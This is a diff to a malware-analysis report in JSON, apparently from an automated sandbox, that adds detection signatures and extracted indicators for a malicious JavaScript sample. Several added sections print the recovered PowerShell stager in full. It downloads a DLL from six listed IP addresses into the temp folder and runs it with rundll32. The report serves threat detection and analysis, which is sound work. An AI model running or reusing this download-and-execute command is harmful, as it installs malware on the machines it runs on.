@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 1130,
+    "score": 1142,
     "sections": [
       {
         "auto_collapse": false,
@@ -14,6 +14,30 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signatures",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: shell.application",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "active_x_object": 10
+          },
+          "signatures": {
+            "active_x_object": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: ActiveXObject",
         "zeroize_on_tag_safe": false
       },
       {
@@ -66,7 +90,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell via powershell.exe\n\t\tShell.Application[12].shellexecute(\"powershell\", \"-encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAL...",
+        "body": "JavaScript runs PowerShell via powershell.exe\n\t\tIOC: The script ran the command 'powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGU...\n\t\tShell.Application[12].shellexecute(\"powershell\", \"-encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAL...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -114,6 +138,124 @@
       },
       {
         "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "IOCs extracted by Box.js",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Start-Sleep -Seconds 3;$PolypharmaconSterve = (\"http://203.96.177.121/lJkDbdp.dathttp://195.20.17.142/lJkDbdp.dathttp://185.231.204.114/lJkDbdp.dathttp://87.236.146.162/lJkDbdp.dathttp://151.80.5.50/lJkDbdp.dathttp://139.180.209.206/lJkDbdp.dat\").split(\",\");foreach ($documentedSabering in $PolypharmaconSterve) {try {Invoke-WebRequest $documentedSabering -TimeoutSec 15 -O $env:TEMP\\Withertip.dll;if ((Get-Item $env:TEMP\\Withertip.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\Withertip.dll,GL70;break;}}catch {Start-Sleep -Seconds 3;}}",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "Start-Sleep -Seconds 3;$PolypharmaconSterve = (\"http://203.96.177.121/lJkDbdp.dathttp://195.20.17.142/lJkDbdp.dathttp://185.231.204.114/lJkDbdp.dathttp://87.236.146.162/lJkDbdp.dathttp://151.80.5.50/lJkDbdp.dathttp://139.180.209.206/lJkDbdp.dat\").split(\",\");foreach ($documentedSabering in $PolypharmaconSterve) {try {Invoke-WebRequest $documentedSabering -TimeoutSec 15 -O $env:TEMP\\Withertip.dll;if ((Get-Item $env:TEMP\\Withertip.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\Withertip.dll,GL70;break;}}catch {Start-Sleep -Seconds 3;}}"
+              ]
+            }
+          }
+        },
+        "title_text": "The script ran the following commands",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "139.180.209.206",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "151.80.5.50",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "185.231.204.114",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "195.20.17.142",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "203.96.177.121",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "87.236.146.162",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "http://203.96.177.121/lJkDbdp.dathttp://195.20.17.142/lJkDbdp.dathttp://185.231.204.114/lJkDbdp.dathttp://87.236.146.162/lJkDbdp.dathttp://151.80.5.50/lJkDbdp.dathttp://139.180.209.206/lJkDbdp.dat",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/lJkDbdp.dathttp:",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 2,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "139.180.209.206",
+                "151.80.5.50",
+                "185.231.204.114",
+                "195.20.17.142",
+                "203.96.177.121",
+                "87.236.146.162"
+              ],
+              "uri": [
+                "http://203.96.177.121/lJkDbdp.dathttp://195.20.17.142/lJkDbdp.dathttp://185.231.204.114/lJkDbdp.dathttp://87.236.146.162/lJkDbdp.dathttp://151.80.5.50/lJkDbdp.dathttp://139.180.209.206/lJkDbdp.dat"
+              ],
+              "uri_path": [
+                "/lJkDbdp.dathttp:"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs found in command lines",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
         "body": "View extracted file 06047c3d6874bfddc1b0efd003775f1dfc1d5285fb27482c77ac96aa04b2f653.cleaned for details.",
         "body_config": {},
         "body_format": "TEXT",
@@ -141,7 +283,7 @@
         "sha256": "59c3899696a97cc35edf3dc682ebc7a54add525ced9977a62e49ac44e171cb1a"
       },
       {
-        "name": "extracted_wscript.ps1",
+        "name": "boxjs_cmds.ps1",
         "sha256": "971cc0af22ed0c974f6b9298aed9d9b0499c25ee5390b211f3d288c61b8993a7"
       }
     ],
@@ -149,6 +291,23 @@
   },
   "results": {
     "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "active_x_object"
+        ]
+      },
       {
         "attack_ids": [],
         "heur_id": 3,
@@ -183,7 +342,61 @@
         "signatures": []
       }
     ],
-    "tags": {},
+    "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "Start-Sleep -Seconds 3;$PolypharmaconSterve = (\"http://203.96.177.121/lJkDbdp.dathttp://195.20.17.142/lJkDbdp.dathttp://185.231.204.114/lJkDbdp.dathttp://87.236.146.162/lJkDbdp.dathttp://151.80.5.50/lJkDbdp.dathttp://139.180.209.206/lJkDbdp.dat\").split(\",\");foreach ($documentedSabering in $PolypharmaconSterve) {try {Invoke-WebRequest $documentedSabering -TimeoutSec 15 -O $env:TEMP\\Withertip.dll;if ((Get-Item $env:TEMP\\Withertip.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\Withertip.dll,GL70;break;}}catch {Start-Sleep -Seconds 3;}}"
+        }
+      ],
+      "network.static.ip": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "139.180.209.206"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "151.80.5.50"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "185.231.204.114"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "195.20.17.142"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "203.96.177.121"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "87.236.146.162"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://203.96.177.121/lJkDbdp.dathttp://195.20.17.142/lJkDbdp.dathttp://185.231.204.114/lJkDbdp.dathttp://87.236.146.162/lJkDbdp.dathttp://151.80.5.50/lJkDbdp.dathttp://139.180.209.206/lJkDbdp.dat"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/lJkDbdp.dathttp:"
+        }
+      ]
+    },
     "temp_submission_data": {
       "cleaned_by_synchrony": true
     }
